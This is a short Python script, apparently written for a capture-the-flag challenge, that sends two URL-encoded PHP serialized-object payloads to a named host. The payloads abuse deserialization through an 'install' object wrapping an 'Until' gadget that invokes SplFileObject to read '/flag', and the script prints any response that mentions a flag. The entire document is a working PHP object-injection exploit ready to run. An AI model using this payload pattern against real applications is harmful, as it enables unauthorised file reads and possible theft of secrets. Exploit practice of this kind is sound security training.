import requests
import urllib.parse

# 测试不同路径的URL
urls = [
    "http://f7c8a2a3.clsadp.com/?data=O%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A5%3A%22Until%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22%2Fflag%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22r%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A8%3A%22password%22%3B%7D",
    "http://f7c8a2a3.clsadp.com/?data=O%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A5%3A%22Until%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A1%3A%22b%22%3Bs%3A4%3A%22flag%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22r%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A8%3A%22password%22%3B%7D",
]

for i, url in enumerate(urls, 1):
    print(f"\n=== Test {i} ===")
    print(f"URL: {url[:100]}...")
    try:
        response = requests.get(url, timeout=10)
        print(f"Status: {response.status_code}")
        print(f"Response:\n{response.text[:1000]}")
        if "flag" in response.text.lower() or "ctf" in response.text.lower():
            print("\n!!! POSSIBLE FLAG FOUND !!!")
            print(response.text)
    except Exception as e:
        print(f"Error: {e}")
